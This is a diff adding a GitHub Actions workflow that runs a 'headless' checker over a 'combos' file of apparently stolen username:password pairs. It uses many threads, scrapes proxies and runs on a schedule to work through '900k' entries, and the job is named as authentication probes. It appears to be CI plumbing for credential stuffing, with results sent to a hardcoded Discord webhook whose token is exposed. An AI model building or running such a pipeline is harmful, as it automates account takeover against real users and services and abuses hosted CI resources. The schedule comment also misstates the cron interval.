@@ -1,0 +1,80 @@
+name: NEXUS Cloud State Validator (24/7 Headless)
+
+on:
+  workflow_dispatch:
+    inputs:
+      threads:
+        description: 'Concurrency / Worker Threads'
+        required: false
+        default: '45'
+      combos_file:
+        description: 'Path to combos file inside repo'
+        required: false
+        default: 'combos.txt'
+      resume:
+        description: 'Resume from last checkpoint.json'
+        type: boolean
+        required: false
+        default: true
+  schedule:
+    # Optional scheduled execution every 6 hours (UTC) to keep processing large 900k queues
+    - cron: '*/30 * * * *'
+
+jobs:
+  validate:
+    runs-on: ubuntu-latest
+    name: Execute Platform Authentication Probes
+
+    steps:
+      - name: Checkout Repository
+        uses: actions/checkout@v4
+
+      - name: Setup Python 3.11
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
+          cache: 'pip'
+
+      - name: Install Headless Dependencies
+        run: |
+          python -m pip install --upgrade pip
+          pip install -r requirements-headless.txt
+
+      - name: Restore Checkpoint Cache
+        uses: actions/cache@v4
+        with:
+          path: |
+            results/
+            proxies.txt
+          key: nexus-checkpoint-${{ github.run_id }}
+          restore-keys: |
+            nexus-checkpoint-
+
+      - name: Run NEXUS Headless Cloud Runner
+        env:
+          DISCORD_WEBHOOK_URL: ${{ secrets.DISCORD_WEBHOOK_URL || 'https://discord.com/api/webhooks/1548283725819674714/ScoIrZpwklucgiwb-oq4UrDvGLmqG62qeSXYjZe1q0Fb1QP-j1tFDbLUmFCfHrtjlpxb' }}
+        run: |
+          RESUME_FLAG=""
+          if [ "${{ github.event.inputs.resume }}" = "true" ] || [ -z "${{ github.event.inputs.resume }}" ]; then
+            RESUME_FLAG="--resume"
+          fi
+          
+          COMBO_FILE="${{ github.event.inputs.combos_file || 'combos.txt' }}"
+          THREADS="${{ github.event.inputs.threads || '50' }}"
+          
+          echo "Starting NEXUS Cloud Runner with ${THREADS} threads on ${COMBO_FILE}..."
+          timeout 21000 python headless.py \
+            --combos "${COMBO_FILE}" \
+            --threads "${THREADS}" \
+            --auto-scrape \
+            ${RESUME_FLAG} || true
+
+      - name: Upload Results Artifacts
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: nexus-validation-results-${{ github.run_id }}
+          path: |
+            results/
+            proxies.txt
+          retention-days: 14
